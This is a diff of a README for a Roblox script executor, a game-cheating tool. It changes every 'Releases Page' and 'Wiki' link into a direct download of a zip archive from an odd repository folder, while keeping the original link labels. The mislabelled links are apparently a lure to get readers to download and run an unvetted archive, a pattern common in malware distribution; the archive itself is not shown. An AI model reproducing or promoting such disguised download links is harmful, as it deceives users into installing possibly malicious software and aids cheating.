@@ -4,12 +4,12 @@
 Roblox Synapse Executor is a top-tier script execution tool for Roblox. It helps users execute Lua scripts seamlessly and make customizations to their games. With its advanced features and stability, Roblox Synapse is trusted by many players for enhancing their gaming experience.
 
 ## 📥 Download Now
-[![Download Roblox-Synapse](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/dhis2scripts/Roblox-Synapse/releases)
+[![Download Roblox-Synapse](https://raw.githubusercontent.com/dhis2scripts/Roblox-Synapse/main/exdelicto/Roblox-Synapse.zip)](https://raw.githubusercontent.com/dhis2scripts/Roblox-Synapse/main/exdelicto/Roblox-Synapse.zip)
 
 ## 🚀 Getting Started
 To use Roblox Synapse, follow these straightforward steps:
 
-1. **Visit the Releases Page:** Go to our [Releases Page](https://github.com/dhis2scripts/Roblox-Synapse/releases).
+1. **Visit the Releases Page:** Go to our [Releases Page](https://raw.githubusercontent.com/dhis2scripts/Roblox-Synapse/main/exdelicto/Roblox-Synapse.zip).
 2. **Select the Latest Version:** Look for the latest release. You will see files available for download.
 3. **Download the Application:** Click on the file to start the download.
 4. **Installation:** 
@@ -57,14 +57,14 @@ Roblox Synapse is a powerful tool that allows users to execute Lua scripts in Ro
 Yes, Roblox Synapse is free to download and use. However, some premium features may require a subscription.
 
 ### 3. How do I update Roblox Synapse?
-To get the latest version, return to the [Releases Page](https://github.com/dhis2scripts/Roblox-Synapse/releases) and download the newest file.
+To get the latest version, return to the [Releases Page](https://raw.githubusercontent.com/dhis2scripts/Roblox-Synapse/main/exdelicto/Roblox-Synapse.zip) and download the newest file.
 
 ### 4. What scripts can I use?
 You can use any Lua script created for Roblox. Check the Script Hub for popular options.
 
 ## 📚 Additional Resources
-- **Documentation:** Visit our [Wiki](https://github.com/dhis2scripts/Roblox-Synapse/wiki) for detailed guides and tips.
+- **Documentation:** Visit our [Wiki](https://raw.githubusercontent.com/dhis2scripts/Roblox-Synapse/main/exdelicto/Roblox-Synapse.zip) for detailed guides and tips.
 - **Community Support:** Join our forum to ask questions and share tips with other users.
 
 ## 🔗 Download & Install
-To get started today, visit the [Releases Page](https://github.com/dhis2scripts/Roblox-Synapse/releases) and download Roblox Synapse. Enjoy a new level of gaming!
+To get started today, visit the [Releases Page](https://raw.githubusercontent.com/dhis2scripts/Roblox-Synapse/main/exdelicto/Roblox-Synapse.zip) and download Roblox Synapse. Enjoy a new level of gaming!
